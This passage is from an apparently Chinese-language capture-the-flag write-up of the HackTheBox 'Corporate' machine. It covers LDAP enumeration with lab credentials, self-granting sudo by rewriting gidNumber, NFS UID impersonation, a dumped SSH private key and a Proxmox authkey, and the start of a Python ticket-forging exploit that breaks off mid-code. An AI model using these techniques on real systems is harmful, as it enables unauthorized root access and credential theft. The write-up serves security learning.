+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch  -H ldap://10.9.0.1 -x -s base namingcontexts</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: namingcontexts</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dn:</span><br><span class="line">namingContexts: dc=corporate,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 2</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 namingContexts 是  <code>dc=corporate,dc=htb</code>​</p>
+<p>從官網介紹中可以看到 user 是 <code>uid</code>​ <a target="_blank" rel="noopener" href="https://www.openldap.org/doc/admin21/intro.html%EF%BC%8C">https://www.openldap.org/doc/admin21/intro.html，</a></p>
+<p>這裏盲猜ou是 <code>ou=users</code>​（經過反復試出來的）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -D <span class="string">&#x27;uid=elwin.jones,ou=users,dc=corporate,dc=htb&#x27;</span> -w <span class="string">&#x27;CorporateStarter04041987&#x27;</span> -H ldap://10.9.0.1 -x -b <span class="string">&quot;dc=corporate,dc=htb&quot;</span> | <span class="built_in">tee</span> ldap.log</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=corporate,dc=htb&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># corporate.htb</span></span><br><span class="line">dn: dc=corporate,dc=htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: corporate</span><br><span class="line">dc: corporate</span><br><span class="line"></span><br><span class="line"><span class="comment"># Users, corporate.htb</span></span><br><span class="line">dn: ou=Users,dc=corporate,dc=htb</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: Users</span><br><span class="line"></span><br><span class="line"><span class="comment"># Groups, corporate.htb</span></span><br><span class="line">dn: ou=Groups,dc=corporate,dc=htb</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: Groups</span><br></pre></td></tr></table></figure>
+
+<p>query 自身的一下ID看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -D <span class="string">&#x27;uid=elwin.jones,ou=users,dc=corporate,dc=htb&#x27;</span> -w <span class="string">&#x27;CorporateStarter04041987&#x27;</span> -H ldap://10.9.0.1 -x -b <span class="string">&quot;uid=elwin.jones,ou=users,dc=corporate,dc=htb&quot;</span> | <span class="built_in">tee</span> ldap.log</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;uid=elwin.jones,ou=users,dc=corporate,dc=htb&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elwin.jones, Users, corporate.htb</span></span><br><span class="line">dn: uid=elwin.jones,ou=Users,dc=corporate,dc=htb</span><br><span class="line">uid: elwin.jones</span><br><span class="line">uidNumber: 5021</span><br><span class="line">gidNumber: 5021</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">objectClass: corpPerson</span><br><span class="line">cn: Elwin Jones</span><br><span class="line">givenName: Elwin</span><br><span class="line">sn: Jones</span><br><span class="line">mail: elwin.jones@corporate.htb</span><br><span class="line">shadowLastChange: 16890</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 14</span><br><span class="line">shadowInactive: 3</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">homeDirectory: /home/guests/elwin.jones</span><br><span class="line">labeledURI: ldap:///ou=Groups,dc=corporate,dc=htb??sub?(&amp;(objectclass=posixgro</span><br><span class="line"> up)(memberuid=elwin.jones))</span><br><span class="line">userPassword:: e1NTSEF9VmtGOTVrYzdPZGZNKzgvbzVVNmZrckRLTzgzM0o4dHo=</span><br><span class="line">corpMemberOf: cn=it,ou=Groups,dc=corporate,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 2</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br></pre></td></tr></table></figure>
+
+<p>嘗試寫一下ldap，修改gid看看，因爲sudo有可能綁定了gid</p>
+<p>看到了這篇 <a target="_blank" rel="noopener" href="https://www.linuxquestions.org/questions/linux-server-73/give-sudo-access-to-existing-ldap-user-4175605756/#post5710125">https://www.linuxquestions.org/questions/linux-server-73/give-sudo-access-to-existing-ldap-user-4175605756/#post5710125</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/group</span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog</span><br><span class="line"><span class="built_in">tty</span>:x:5:</span><br><span class="line">......</span><br><span class="line">tape:x:26:</span><br><span class="line">sudo:x:27:</span><br><span class="line">audio:x:29:</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 sudo group 在 <code>27</code>​</p>
+<p>首先要新建一個文件，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@corporate-workstation-04:~$ <span class="built_in">cat</span> mane.diff</span><br><span class="line">dn: uid=elwin.jones,ou=<span class="built_in">users</span>,dc=corporate,dc=htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: gidNumber</span><br><span class="line">gidNumber: 27</span><br></pre></td></tr></table></figure>
+
+<p>然後 ldapmodify，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@corporate-workstation-04:~$ ldapmodify -vx -W -f mane.diff  -D <span class="string">&#x27;uid=elwin.jones,ou=users,dc=corporate,dc=htb&#x27;</span> -H  ldap://10.9.0.1 -x</span><br><span class="line">ldap_initialize( ldap://10.9.0.1:389/??base )</span><br><span class="line">Enter LDAP Password:</span><br><span class="line">replace gidNumber:</span><br><span class="line">        27</span><br><span class="line">modifying entry <span class="string">&quot;uid=elwin.jones,ou=users,dc=corporate,dc=htb&quot;</span></span><br><span class="line">modify complete</span><br></pre></td></tr></table></figure>
+
+<p>可以看到居然可以成功，​​</p>
+<p>然後 <code>sudo -s</code>​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223193546-z3u6b1k.png" alt="image">​</p>
+<p>如果有上面提示的話就要重新登陸一下ssh。</p>
+<p>​​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224010439-3josad3.png" alt="image">​​</p>
+<h2 id="0x10-NFS-查找敏感文件"><a href="#0x10-NFS-查找敏感文件" class="headerlink" title="0x10 NFS 查找敏感文件"></a>0x10 NFS 查找敏感文件</h2><p>因爲看到有nfs，所以<code>mount</code>​ 一下看看</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224010536-0pxpfxe.png" alt="image">​</p>
+<p>原來home目錄是遠程挂載，</p>
+<blockquote>
+<p>The NFS protocol has <strong>no mechanism for authentication</strong> or <strong>authorization</strong>. The authorization is taken from the available information of the file system where the server is responsible for translating the <strong>user information</strong> supplied by the <strong>client</strong> to that of the <strong>file system</strong> and converting the corresponding authorization information as correctly as possible into the syntax required by UNIX.</p>
+<p>The most common <strong>authentication is via UNIX UID&#x2F;GID and group memberships</strong>, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the <strong>client</strong> and <strong>server</strong> do <strong>not necessarily</strong> have to have the <strong>same mappings of UID&#x2F;GID</strong> to users and groups. No further checks can be made on the part of the server. This is why NFS should <strong>only</strong> be used with this authentication method in <strong>trusted networks</strong>.</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting</a></p>
+</blockquote>
+<p>也就是説nfs只認主機，儅拿到了root，就意味著你可以去你想去的地方，乾脆把他mount過來看看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mount.nfs 10.9.0.1:/ /tmp/mane -o nolock</span><br></pre></td></tr></table></figure>
+
+<p>可以看到只是挂載了home目錄。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011450-frahvbu.png" alt="image">​</p>
+<p>這個時候去找想要的用戶，再次通過ldap，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011136-epyalnr.png" alt="image">​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011232-cbjdh3v.png" alt="image">​</p>
+<p>可以看到有兩個用戶在 <code>sysadmin</code>​ 的組裏面，第一個是 <code>amie.torphy</code>​  和 <code>stevie.rosenbaum</code>​ ，然後可以根據hacktricks的提示，切換uid即可以進去。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011700-qrbnyl0.png" alt="image">​</p>
+<p>找到了一個 <code>id_rsa</code>​ 文件，嘗試用這個文件登錄 PVE。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011846-q9fuq6u.png" alt="image">​</p>
+<p>成功了，這樣就把這個id_rsa給dump下來。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEApgZFFMMTgdnbECiJXbV85jXxOV9yZNRaLHIfNFfeJJMSQRLC7YEx</span><br><span class="line">E3IyKXIUzLzbHtNgwcbBkDU0DZI2VJhPNWqIETfyrAxnSJ4mUaRdVYHm2HQ5NMWSWW/Vlg</span><br><span class="line">5ci1+DO+oOpyvLBMxNwmzy7dIEkR2XO81W6Aik3WFbSYOCv5f9s/HYEi+6MGYr1Iu+Txqt</span><br><span class="line">ZpjBN7qFXjNngGmG827I/I72Yu/X4yiNKRgmKpzBx0SLySALCa3FI0PJGr4HN12cXeZDGA</span><br><span class="line">xnQ06WM6H4ktS87Qhe+rBduuuMpFVA5kPV3/UrnfJdqLcmWefcvSryRtWuMf5tUdkHiYJY</span><br><span class="line">J6pR8RfbtiH9uEjwemd73Fcuwqu31imG+AYh9l5/BbM0k8cKOd1ldBbNHd0XQhssjgELJF</span><br><span class="line">wMGMC+4WmcB+i1LpKKXw1HIww8cRaONwUUlAq2K5qoP88Fbf26auZ4pdJAzf+9D7a7k07J</span><br><span class="line">o26NFAUW80Wghrca0slQyuXVO5qcJNp6inzCsbodAAAFoGkiCHJpIghyAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKYGRRTDE4HZ2xAoiV21fOY18TlfcmTUWixyHzRX3iSTEkESwu2BMRNyMilyFMy8</span><br><span class="line">2x7TYMHGwZA1NA2SNlSYTzVqiBE38qwMZ0ieJlGkXVWB5th0OTTFkllv1ZYOXItfgzvqDq</span><br><span class="line">crywTMTcJs8u3SBJEdlzvNVugIpN1hW0mDgr+X/bPx2BIvujBmK9SLvk8arWaYwTe6hV4z</span><br><span class="line">Z4BphvNuyPyO9mLv1+MojSkYJiqcwcdEi8kgCwmtxSNDyRq+BzddnF3mQxgMZ0NOljOh+J</span><br><span class="line">LUvO0IXvqwXbrrjKRVQOZD1d/1K53yXai3Jlnn3L0q8kbVrjH+bVHZB4mCWCeqUfEX27Yh</span><br><span class="line">/bhI8Hpne9xXLsKrt9YphvgGIfZefwWzNJPHCjndZXQWzR3dF0IbLI4BCyRcDBjAvuFpnA</span><br><span class="line">fotS6Sil8NRyMMPHEWjjcFFJQKtiuaqD/PBW39umrmeKXSQM3/vQ+2u5NOyaNujRQFFvNF</span><br><span class="line">oIa3GtLJUMrl1TuanCTaeop8wrG6HQAAAAMBAAEAAAGAEeK8h/VREWzbFvVLASOnYjSe+V</span><br><span class="line">+RNxASa9XaizzJE3cdoRGImuYPV6k2grUFzR2uXHaIpq+HFEZLBohBHqFu7RH+OR6mH8dR</span><br><span class="line">TCcveR2kKW1OZXS14fvD3as43wrKiQA/5tE7BWLoIurwmJi8ngbBU7HUpE5lhadCvY+6si</span><br><span class="line">N/Dy1sWTmdXa4zGHo1UBdC6Ao3coVT0XFgY0rV5GVZ8rk1YVH0dKmigBgTBwGRQQd0r8cw</span><br><span class="line">aPkw/zivc3JexKkCpYIJxSW/vu6tIYhiMqKL2dnNlm4FaHoyMz3MeH9IJ/z6HwM6B0yiVR</span><br><span class="line">vZ9L7LrzppeI6gcF36n1TFplLOal5V1MkuYOpKP7TtEFdB4qx00hsJae7lrjE195eD2jR7</span><br><span class="line">SaysdFlf7Z6c7ahbhT2xBJA73rw9up5w8Jp9pgMZm554HTO6Q3KndLzhGDMKBAqk3vrhey</span><br><span class="line">EzNnGRgoRbQ4Rp/MrwfGfrb7TqJ1mY5eN0cfhRRPdldUhf+/K5zJ+L9O38Xd7ARjrhAAAA</span><br><span class="line">wQCt+0kqxiHjIvVua2jCfpx4tb5mPFVuMDAr0e/FFLV9Ibk1AxBXPag2Kgw7V8HWQkoiIS</span><br><span class="line">K45V+QhNRh+<span class="built_in">dd</span>/jDyghOv4tlfbi2/PgRZU70eUqT4g3Y0K54xR0bqXMalYirtj9Mk7AAj2</span><br><span class="line">D4rCxb9idf0Rtc1nm34gDX1hvhlz3qe6zi9csLaA67M8jvFD0PPkaun3KFz7p5oatSPXBn</span><br><span class="line">iVT5OiCsQzJKKEj7w9iddd2bJsqYTTG1bk/6LG+xSrl57pEYsAAADBAMDDGhC5mtpjG6oH</span><br><span class="line">eBW43VqL2P7Ks4QMp7t9yolV5tWkVv2++Ve3NwTZdQvrHrGwSZTw6ajT7bc0fDwwIHo8N6</span><br><span class="line">eDP2eQb/5+0PU1fhrwQ3ydzggxL2GBp6a/z5RMT90lOdGDqx8Tu711pUaMJLfS3h/ekNgR</span><br><span class="line">dD7QP2EaKUOEouQ/QXDFWgtZ++fmmIAQoHU2Au28iuHRG2WTfJyLvnqX2Tyl+5zDv3tZwk</span><br><span class="line">hfgKMyu1f7nl7e6sP9ngTMopQOKm0/fQAAAMEA3H2j56msbjs2shQGjWI8n5THFnG6cVIe</span><br><span class="line">YQFILUxGznBf7JWPKofuqG8/Sh/PtDd+4jPLpFQCzWt3GCq7klw4NZMbdzZ0/44MG4qIvZ</span><br><span class="line">DGy6kpLvaZezgJGgccXWbMfbQXHMteid30lVhsMXcdRHAk0A7y7E/sqiFP6ai5AxnHp79O</span><br><span class="line">HI9lBvXBcEe5ygrTNLaRHOKBUwszk08S55rDgziUYFiWCDL5okPjjNuL2YWJN3584eYFCq</span><br><span class="line">/Mn31W4nU5mqchAAAAJGFtaWUudG9ycGh5QGNvcnBvcmF0ZS13b3Jrc3RhdGlvbi0wNAEC</span><br><span class="line">AwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x11-shell-on-the-sysadmin-to-Root"><a href="#0x11-shell-on-the-sysadmin-to-Root" class="headerlink" title="0x11 shell on the sysadmin to Root"></a>0x11 shell on the sysadmin to Root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh -i key sysadmin@10.9.0.1</span><br><span class="line">Linux corporate 5.15.131-1-pve <span class="comment">#1 SMP PVE 5.15.131-2 (2023-11-14T11:32Z) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Nov 29 14:43:11 2023 from 10.8.0.2</span><br><span class="line">sysadmin@corporate:~$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sysadmin@corporate:/var/backups$ <span class="built_in">ls</span></span><br><span class="line">alternatives.tar.0        dpkg.arch.0           dpkg.diversions.2.gz    dpkg.status.1.gz                                     unknown-2.4.57+dfsg-3+deb11u1-20230407-203136.ldapdb</span><br><span class="line">apt.extended_states.0     dpkg.arch.1.gz        dpkg.statoverride.0     dpkg.status.2.gz</span><br><span class="line">apt.extended_states.1.gz  dpkg.arch.2.gz        dpkg.statoverride.1.gz  proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz</span><br><span class="line">apt.extended_states.2.gz  dpkg.diversions.0     dpkg.statoverride.2.gz  pve-host-2023_04_15-16_09_46.tar.gz</span><br><span class="line">apt.extended_states.3.gz  dpkg.diversions.1.gz  dpkg.status.0           slapd-2.4.57+dfsg-3+deb11u1</span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>/var/backups</code>​ 有一些敏感文件，<code>proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz</code>​</p>
+<p>解壓了如下：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223210954-5u0nr3j.png" alt="image">​</p>
+<p>然後搜索一下關於PVE的CVE，看到這篇 <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/">https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/</a></p>
+<p>根據這篇，只要有<code>/etc/pve/priv/authkey.key</code>​ 或者 <code>/etc/pmg/pmg-authkey.key</code>​ 就可以成功提權。</p>
+<p>所以嘗試尋找一下備份有沒有這兩個文件，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep -a <span class="string">&quot;authkey.key&quot;</span> -Ri .</span><br><span class="line">$ <span class="built_in">cat</span> ./var/lib/pve-cluster/config.db</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211234-3to3zt9.png" alt="image">​</p>
+<p>把這個key複製下來，保存成<code>authkey.key</code>​ ，然後參考上面的exploit 製作一個cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA4qucBTokukm1jZuslN5hZKn/OEZ0Qm1hk+2OYe6WtjXpSQtG</span><br><span class="line">EY8mQZiWNp02UrVLOBhCOdW/PDM0O2aGZmlRbdN0QVC6dxGgE4lQD9qNKhFqHgdR</span><br><span class="line">Q0kExxMa8AiFNJQOd3XbLwE5cEcDHU3TC7er8Ea6VkswjGpxn9LhxuKnjAm81M4C</span><br><span class="line">frIcePe9zp7auYIVVOu0kNplXQV9T1l+h0nY/Ruch/g7j9sORzCcJpKviJbHGE7v</span><br><span class="line">OXxqKcxEOWntJmHZ8tVb4HC4r3xzhA06IRj3q/VrEj3H6+wa6iEfYJgp5flHtVA8</span><br><span class="line">8TlXitfsBH+ZT41CH3/a6JudMYSLGKvatGgjJQIDAQABAoIBAQCBBoBcNVmctMJk</span><br><span class="line">ph2Z6+/ydhXyOaCKA2tM4idvNXmSpKNzUbiD3EFBi5LN6bV3ZP05JA3mj/Y4VUlB</span><br><span class="line">Gr4cY4zXgEsntsU9a8n79Oie7Z/3N0x5ZV7rdxACJazqv17bq/+EHpEyc3b3o2Rx</span><br><span class="line">dNBSVi3IKup8nnY3J4wgFtEv/eqzefDc4ODcDIz/j46eh/TZLll7zhesJ6Icfml3</span><br><span class="line">aZ3GjWdQWOwlj1rDCP7S/ehryNbB7p2T/FVHw6tbMf7XYtjlWzQbns+m9sQmrD3Q</span><br><span class="line">Lmw9zk7NyCuZi0/l8XiaJINv4VWFUuU4/KrifW7az81AAVcNLSKkg2AQ9Q3VSdyH</span><br><span class="line">z1p5Hz8tAoGBAP5wTIwhG781oHR3vu15OnoII9DFm80CtmeqA5mL2LzHB5Po2Osn</span><br><span class="line">wkspMpKioukFWcnwZO9330h/FSyv6zYJP/5QfwTkskEsYli6emdwJgb0C+HJYVVx</span><br><span class="line">/CWeDNvLhyNam0HcqzXMFzQhLfGaKoq4FZ95ozNOCv1K83G379o7VsRPAoGBAOQP</span><br><span class="line">sFdEEgDB/t0lnOEFfRSTwtJ2/IlLwBLMlm09aIwB7DqI9dl8fIcq8YR03XhGzIg0</span><br><span class="line">H28xf3b5Ql619VJ9YESRSq+F4VjuMzJpXJuHshR9wQZy8RDEtr43OwTBOG7sUNKi</span><br><span class="line">I0MBFxEmfaPeZCIZCLouam1JBNAA3YwFxlPm8WBLAoGAXOmtSk6cz0pJ+b3wns9y</span><br><span class="line">JzXpvkcrCcY/zcMr5VpIH0ee4MhaziSKst+sdBen3efyTefXNAtWIicmGFd1URo3</span><br><span class="line">oCrM94B8B4ipsTUHldZCTK+51w2u2YDyTtpUX78G7kYcBAUNEGwi3QpwuJVPi7CF</span><br><span class="line">VOMaUZXiNXS1SYWdtNeOa8kCgYA60g0SRN070s0wLo5Kv0amcwHRlJzHsIDmmFvH</span><br><span class="line">6wm26pwJ8N8v69qWZi4KkrW4WtJP4tmkrSiJ//ntQZL3ZpzYsnyHzsjzTeRogSJA</span><br><span class="line">fvwgKtsJFcY1I/daEhanwEoU2eByoxzjIDnZ04qeJDLBVKGam3QZobabC04Y2jhv</span><br><span class="line">1WW2BwKBgCD/j2QWr62kh48MY5hCG94YrZRiH1+WdJul+HpTXGax0kB8bXXehh7N</span><br><span class="line">n4+xaiJCTUElVEm2KH/7C8yKoytm8HR7eRrq7SJSbWEmvI/1Yhj1A9g2/vrCxOlm</span><br><span class="line">GtYXpgsbUgcGgg3Hr9/piitsBlSME6niawdxaMT9eLyLNUAnHRec</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_ticket</span>(<span class="params">authkey_bytes, username=<span class="string">&#x27;root@pam&#x27;</span>, time_offset=-<span class="number">30</span></span>):</span><br><span class="line">    timestamp = <span class="built_in">hex</span>(<span 